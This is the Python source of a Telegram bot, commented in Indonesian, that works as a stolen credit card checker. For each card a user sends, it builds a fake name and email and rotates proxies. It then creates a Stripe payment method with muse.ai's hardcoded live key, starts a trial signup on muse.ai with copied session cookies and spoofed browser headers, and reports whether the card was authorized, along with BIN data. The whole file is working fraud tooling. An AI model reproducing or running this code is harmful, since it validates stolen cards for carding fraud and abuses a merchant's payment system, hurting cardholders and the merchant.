import asyncio
import aiohttp
from aiohttp import ClientTimeout
import random
import string
import logging
import os
from faker import Faker

from telegram import Update, Message
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import BadRequest

# --- KONFIGURASI ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
fake = Faker()

# Konfigurasi logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- GLOBAL VARIABLES & DATA ---
PROXIES = []
STRIPE_KEY = "pk_live_a6DCdatuNGQFYQOaddF0Guf3"
MUSE_COOKIES = {
    "mode": "light", "_ga": "GA1.1.624514859.1750016648", "_gcl_au": "1.1.1507302922.1750016648",
    "intercom-id-zu1nwzdd": "939b1207-6933-43fc-941c-f6f197d063fd", "intercom-session-zu1nwzdd": "",
    "intercom-device-id-zu1nwzdd": "9bd14dc9-1628-427a-95cf-64c7241079cd", "__stripe_mid": "9c2e3b31-8c5f-430d-8345-dbd520b386d5be127e",
    "ab_pricing": "0", "ab_landing": "0", "__stripe_sid": "5073db46-415c-4e23-835e-accd767e84826b6b8e",
    "_ga_S9Q9QN5EN6": "GS2.1.s1750440172$o14$g1$t1750440223$j9$l0$h0",
}
BASE_HEADERS = {
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "accept": "application/json, text/javascript, */*; q=0.01", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"", "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
}

# --- FUNGSI HELPER ---
def load_proxies():
    global PROXIES
    try:
        with open('proxies.txt', 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        if PROXIES: logger.info(f"Successfully loaded {len(PROXIES)} proxies.")
        else: logger.warning("proxies.txt is empty. Running without proxies.")
    except FileNotFoundError:
        logger.warning("proxies.txt not found. Running without proxies.")

async def edit_message_safe(message: Message, text: str):
    try:
        await message.edit_text(text)
    except BadRequest as e:
        if "Message is not modified" not in str(e): logger.error(f"Error editing message: {e}")

async def get_bin_info(bin_number: str):
    if len(bin_number) < 6: return None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://lookup.binlist.net/{bin_number[:6]}", headers={'Accept-Version': '3'}) as response:
                return await response.json()
    except Exception as e:
        logger.error(f"Failed to get BIN info: {e}")
        return None

def format_bin_info(d): return f"Brand: {d.get('scheme','?').upper()}\n⇻ Type: {d.get('type','?').upper()}\n⇻ Bank: {d.get('bank',{}).get('name','?').upper()}\n⇻ Country: {d.get('country',{}).get('name','?').upper()} {d.get('country',{}).get('emoji','')}" if d else "Brand:?\n⇻ Type:?\n⇻ Bank:?\n⇻ Country:?"
def get_decline_message(c): return {"do_not_honor":"Penerbit kartu menolak pembayaran.","insufficient_funds":"Dana tidak mencukupi."}.get(c,c.replace("_"," ").capitalize()) if c else "N/A"

# --- FUNGSI UTAMA PENGUJIAN KARTU DENGAN AIOHTTP ---

async def check_card_on_muse(cc, mm, yy, cvc, message: Message, proxy_url=None):
    name = fake.name()
    email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
    timeout = ClientTimeout(total=30)
    
    logger.info(f"--- STARTING CHECK FOR {cc[:6]}...{cc[-4:]} with aiohttp ---")
    
    async with aiohttp.ClientSession(cookies=MUSE_COOKIES, timeout=timeout) as session:
        # === LANGKAH 1: BUAT PAYMENT METHOD ===
        try:
            await edit_message_safe(message, "⏳ [1/4] Creating Payment Method...")
            logger.info("[Step 1/4] Sending request to api.stripe.com/v1/payment_methods")
            pm_data = {'type': 'card', 'billing_details[name]': name, 'billing_details[email]': email, 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_month]': mm, 'card[exp_year]': yy, 'guid': 'bbeb7dc1-2f34-4cba-9e5a-d39fa215300a0b6163', 'payment_user_agent': 'stripe.js/22a1c02c9a', 'time_on_page': str(random.randint(50000, 60000)), 'key': STRIPE_KEY}
            stripe_headers = {**BASE_HEADERS, "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/"}
            
            async with session.post("https://api.stripe.com/v1/payment_methods", data=pm_data, headers=stripe_headers, proxy=proxy_url) as pm_resp:
                pm_resp.raise_for_status()
                pm_json = await pm_resp.json()

            pm_id = pm_json.get("id")
            if not pm_id:
                logger.error(f"[Step 1/4] FAILED. No 'id' in Stripe response: {pm_json}")
                return {"status": "error", "message": "Stripe PM creation failed (no ID)."}
            logger.info(f"[Step 1/4] SUCCESS. Got PaymentMethod ID: {pm_id}")

        except aiohttp.ClientResponseError as e:
            logger.error(f"[Step 1/4] FAILED. HTTP Status {e.status}. Response: {e.message}")
            error_data = (await e.json()).get("error", {})
            code = error_data.get("decline_code") or error_data.get("code", "http_error")
            return {"status": "declined", "code": code, "message": get_decline_message(code)}
        except aiohttp.ClientError as e:
            logger.error(f"[Step 1/4] FAILED. Network/Request error: {type(e).__name__} - {e}")
            return {"status": "error", "message": f"Network Error at Step 1: {type(e).__name__}"}
        
        # === LANGKAH 2: MULAI PEMBAYARAN DI MUSE.AI ===
        try:
            await edit_message_safe(message, "⏳ [2/4] Initializing on muse.ai...")
            logger.info(f"[Step 2/4] Sending request to muse.ai/api/pay/start with PM_ID: {pm_id}")
            start_payload = {"email": email, "name": name, "trial": 1, "tier": "basic", "pm": pm_id, "ab_pricing": 0, "ab_landing": 0, "cost_month": 16, "duration": 2629800, "access": "", "referral": ""}
            start_headers = {**BASE_HEADERS, "content-type": "application/json; charset=UTF-8", "origin": "https://muse.ai", "referer": "https://muse.ai/join", "x-requested-with": "XMLHttpRequest"}
            
            async with session.post("https://muse.ai/api/pay/start", json=start_payload, headers=start_headers, proxy=proxy_url) as start_resp:
                start_resp.raise_for_status()
                start_data = await start_resp.json()

            client_secret, seti_id = start_data.get("secret"), start_data.get("id")
            if not client_secret or not seti_id:
                logger.error(f"[Step 2/4] FAILED. No 'secret' or 'id' in muse.ai response: {start_data}")
                return {"status": "error", "message": "Muse.ai API failed (no secret)."}
            logger.info(f"[Step 2/4] SUCCESS. Got SetupIntent ID: {seti_id}")

        except aiohttp.ClientResponseError as e:
            logger.error(f"[Step 2/4] FAILED. HTTP Status {e.status}. Response: {e.message}")
            return {"status": "error", "message": f"Muse.ai API Error: {e.status}"}
        except aiohttp.ClientError as e:
            logger.error(f"[Step 2/4] FAILED. Network/Request error: {type(e).__name__} - {e}")
            return {"status": "error", "message": f"Network Error at Step 2: {type(e).__name__}"}

        # === LANGKAH 3: KONFIRMASI SETUP INTENT ===
        try:
            await edit_message_safe(message, "⏳ [3/4] Confirming with Stripe...")
            logger.info(f"[Step 3/4] Sending request to api.stripe.com to confirm {seti_id}")
            confirm_data = {'key': STRIPE_KEY, 'client_secret': client_secret, 'payment_method': pm_id}
            
            async with session.post(f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm", data=confirm_data, headers=stripe_headers, proxy=proxy_url) as confirm_resp:
                confirm_json = await confirm_resp.json()
            
            logger.info(f"[Step 3/4] Got response from Stripe confirm: {confirm_json}")

            if confirm_resp.status == 200 and confirm_json.get("status") == "succeeded":
                logger.info("[Step 3/4] SUCCESS. Status is 'succeeded'.")
                return {"status": "approved", "code": "succeeded", "message": "Your card has been authorized."}
            else:
                logger.info("[Step 3/4] FAILED or requires action. Status is not 'succeeded'.")
                error = confirm_json.get("last_setup_error") or confirm_json.get("error", {})
                code = error.get("decline_code") or error.get("code", "unknown_decline")
                return {"status": "declined", "code": code, "message": get_decline_message(code)}
        
        except aiohttp.ClientError as e:
            logger.error(f"[Step 3/4] FAILED. Network/Request error: {type(e).__name__} - {e}")
            return {"status": "error", "message": f"Network Error at Step 3: {type(e).__name__}"}

# --- HANDLER TELEGRAM ---
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_html(f"👋 Welcome, {user.mention_html()}!\n\n<b>Available Commands:</b>\n\n<code>/au cc|mm|yy|cvc</code>\n\n<b>Bot by:</b> Secure Auth Team")

async def au_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # (Fungsi ini tidak berubah, hanya memanggil check_card_on_muse yang baru)
    user = update.effective_user
    try:
        card_info = update.message.text.split(maxsplit=1)[1]
        cc, mm, yy, cvc = card_info.split('|')
        if len(yy) == 2: yy = "20" + yy
        if not all(x.isdigit() for x in [cc, mm, yy, cvc]) or len(cc) < 12: raise ValueError
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Format Salah. Gunakan: /au cc|mm|yy|cvc")
        return

    checking_msg = await update.message.reply_text("⏳ Initializing...")
    proxy_to_use = random.choice(PROXIES) if PROXIES else None
    
    check_task = asyncio.create_task(check_card_on_muse(cc, mm, yy, cvc, message=checking_msg, proxy_url=proxy_to_use))
    bin_task = asyncio.create_task(get_bin_info(cc))
    result, bin_data = await check_task, await bin_task
    
    await edit_message_safe(checking_msg, "✅ Finalizing result...")
    
    full_cc_info = f"{cc}|{mm}|{yy}|{cvc}"
    bin_info_str = format_bin_info(bin_data)
    
    final_message = "↬ Secure | Auth ↫\n- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ CC: {full_cc_info}\n"
    if result['status'] == 'approved': final_message += f"⇻ Status: Approved! ✅\n⇻ Result: {result['message']}\n⇻ Code: {result['code'].capitalize()}\n"
    elif result['status'] == 'declined': final_message += f"⇻ Status: Decline! ❌\n⇻ Result: {result['message']}\n⇻ Code: {result['code']}\n"
    else: final_message += f"⇻ Status: Error! ⚠️\n⇻ Result: {result['message']}\n"
    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ {bin_info_str}\n"
    final_message += "- - - - - - - - - - - - - - - - - - - - -\n"
    final_message += f"⇻ Proxy: {proxy_to_use or 'None'}\n"
    final_message += f"(↯) Checked by: @{user.username or user.first_name}"
    
    await edit_message_safe(checking_msg, final_message)

def main():
    if not TELEGRAM_BOT_TOKEN:
        logger.critical("FATAL: TELEGRAM_BOT_TOKEN environment variable not set!")
        return
    load_proxies()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_error_handler(error_handler)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("au", au_command))
    logger.info("Bot is starting with aiohttp...")
    application.run_polling()

if __name__ == "__main__":
    main()
